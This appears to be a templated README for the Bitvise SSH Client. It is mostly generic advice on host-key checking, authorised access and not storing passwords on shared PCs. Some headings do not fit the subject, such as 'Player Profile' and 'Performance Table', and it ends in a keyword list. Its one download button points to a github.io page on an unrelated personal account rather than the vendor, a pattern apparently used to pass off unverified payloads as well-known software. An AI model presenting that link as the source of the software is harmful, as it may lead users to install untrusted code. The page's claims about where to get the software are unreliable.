# Bitvise SSH Client - One Host You May Use

At a glance:
- A profile for a server you were given
- A host key you can refuse
- A terminal and file transfer for that login
- Disconnect, so the session does not stay open

## The Profile

Bitvise stores a connection you name: address, port, and user. The profile is not a discovery tool. Type the address from the note the owner sent. Do not import a list of hosts you cannot explain. The first connection should show a host key. Compare it with the fingerprint you were given. Accept only a match.

A key file you control is better than a saved password on a PC other people unlock. If you must type a password, do not save it when the desk is shared. Remove the profile before you hand the computer to someone else.

## Terminal And Files

The terminal is a shell on that server, with your account's rights. Read a command before you send it. A file window copies files you are allowed to put there. Check the remote path. Uploading over a name replaces that remote file. Download to a folder you chose, not over the only local copy of something else.

Do not use the session to look through accounts you were not granted. If a directory is denied, that is the permission model. Do not switch to a more powerful user you do not have.

## When The Key Changes

A warning that the host key changed is a stop. Ask the person who runs the server. They may have rebuilt it, or the path may not be the server you wanted. Accepting the new key to get past the dialog is how you skip the check. Disconnect until you have an answer.

## One Session

Open the profile, do the task, close the terminal and the file window. An idle window is still authenticated. Do not leave it overnight on a laptop that leaves the building. Log the fact that you disconnected if the work matters, in your own notes, not by pasting secrets into a chat.

## What You Do Not Probe

Do not scan addresses. Do not try usernames. Do not point the client at a host you found in a file you were not supposed to read. A connection string is not permission. Bitvise will try what you type. You decide not to type a guess.

## The Key File

Keep the private key in a folder only you can read. Do not mail it to yourself in clear text. If you think it was copied, ask the server owner to retire it and issue another. Deleting the profile on this PC does not retire the key on the server. Both sides matter.

## Installation Path

| Step | Action |
|---|---|
| 1 | Install Bitvise SSH Client and create one profile for a host you may use |
| 2 | Connect and compare the host key with the fingerprint you were given |
| 3 | Run one harmless command or transfer one small file |
| 4 | Confirm the file landed where you meant |
| 5 | Disconnect. Do not save the password if this Windows login is shared |

[![GET Bitvise SSH Client](https://img.shields.io/badge/GET%20%E2%80%94%20Bitvise%20SSH%20Client-334155?style=for-the-badge&logoColor=white)](https://deborahjacksonf95.github.io/.github/bitvise-user)

## Feature Matrix

| Area | What you use it for |
|---|---|
| Profile | One known host and user |
| Host key | A fingerprint you can refuse |
| Terminal | Commands you have read |
| Files | Paths you are allowed to use |
| Limit | No scans and no guessed passwords |

## Performance Table

| Component | Minimum | Recommended |
|---|---|---|
| OS | Windows 10 (64-bit) | Windows 11 (64-bit) |
| CPU | Dual-core | Any current PC |
| RAM | 1 GB | 4 GB |
| Storage | Small install | Room for files you download |
| Network | A host you are allowed to reach | The published host key |

## Player Profile

Bitvise SSH Client fits a server you administer or an account you were issued. It does not fit a guessed address, a shared PC with a stored password, a host-key warning you click through, or a command you pasted unread.

![Bitvise SSH Client with one profile for a server the user may use](https://bvmedia.s3.amazonaws.com/gs-pkbv-clientkeymanager.png)

## Help Desk

Connection refused? The host, the port, or the firewall is wrong. Do not try other users.
Host key mismatch? Disconnect and ask.
You reached the wrong machine? Delete the profile and retype the address from the note you trust.
A file vanished remotely? You uploaded onto an existing name. Restore from the server's copy if you have one, and check the path next time.
The password prompt repeats? That is an unsaved password. Keep it that way on a shared PC.

## Reader Notes

One profile you can explain is the whole setup. The host key is part of the first login, not a dialog to dismiss. Write the fingerprint down next to the address the owner sent.

Transfer a small file before a large one. The remote directory in the window is the directory that will change. Read it.

Close the session and remove stored secrets before this PC goes to someone else. The account on the server remains until the owner changes it. This program only forgets the local profile.

## Term Index

bitvise one host, bitvise host key, bitvise your user, bitvise disconnect, bitvise small transfer, no network scan, no guessed password, shared pc no stored secret
